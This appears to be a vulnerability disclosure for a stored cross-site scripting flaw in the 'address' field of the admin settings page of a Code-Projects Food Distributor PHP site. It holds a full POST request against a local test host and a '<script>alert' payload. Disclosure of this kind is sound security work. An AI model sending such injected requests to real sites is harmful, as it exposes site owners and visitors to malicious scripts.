Cross-Site Scripting vulnerability in the `address` parameter of the Site Settings functionality

```
/fooddis/admin/save_settings.php
```

Vendor Homepage:

```
https://code-projects.org/food-distributor-site-in-php-with-source-code/
```

Version: 

```
V1.0
```

Tested on: 

```
PHP
```

Affected Page:

```
/fooddis/admin/save_settings.php
```

The `address` parameter in the `save_settings.php` file of the Code-Projects Food Distributor System is vulnerable to XSS Injection. 

Proof of vulnerability:
<img width="952" alt="image" src="https://github.com/user-attachments/assets/aa8507a8-b0ed-4c9d-a00d-32f79016584c" />
<img width="1075" alt="image" src="https://github.com/user-attachments/assets/8ebdbe37-be91-4e17-a402-a661a4d23741" />






Request:

```
POST /fooddis/admin/save_settings.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 1752
Cache-Control: max-age=0
sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIhGmSS8HxYIWuPDR
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/fooddis/admin/site_settings.php?success=true
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=b409c2d300348e8d3c7d564868ff9e2f
Connection: keep-alive

------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="site_name"

Food Website
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="site_title"

Food Website
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="site_keyword"

Site
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="site_desc"

Food Website, established in 2018, is a well known ethic food distributor in Nigeria. With previous experience in food technology and research, Lumidek Associates Ltd. is the market leader in serving high quality and health promoting food products across Nigeria.
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="google_code"

09tghjpo987hpnjkb
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="site_email"

test@qq.com
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="site_phone"

123456789
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="linkedin"

(+234)000 000 1353
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="facebook"

https://facebook.com
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="twitter"

fubxx
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="address"

<script>alert('XSS')</script>
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="city"

Eliozu road, off Airport road, Port Harcourt, Rivers state
------WebKitFormBoundaryIhGmSS8HxYIWuPDR
Content-Disposition: form-data; name="country"

Nigeria
------WebKitFormBoundaryIhGmSS8HxYIWuPDR--

```

payload

```
<script>alert('XSS')</script>
```

